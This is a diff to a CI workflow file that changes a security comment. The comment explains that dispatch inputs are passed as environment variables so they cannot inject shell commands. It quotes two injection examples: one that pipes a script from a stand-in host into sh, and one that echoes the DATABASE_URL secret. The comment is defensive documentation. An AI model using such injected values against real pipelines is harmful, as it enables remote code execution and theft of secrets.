@@ -65,7 +65,10 @@ jobs:
       # the script, so a dispatch value like `x; curl evil.sh | sh` executes with
       # the runner's DATABASE_URL in scope. This is the exact class
       # tests/test_workflow_no_run_body_interpolation.py exists to reject — and
-      # the same escalation already recorded on content-canonical-election.yml.
+      # the same escalation that was recorded on content-canonical-election.yml,
+      # where `x"; echo $DATABASE_URL; #` in a dispatch input printed the secret.
+      # (That workflow was deleted 2026-08-26 when its lane moved to a Cloud Run
+      # Job; the finding is restated here rather than left as a dead pointer.)
       # As env vars the values are data: the shell expands them after parsing,
       # and quoting keeps them one argument each.
       - name: Run flip
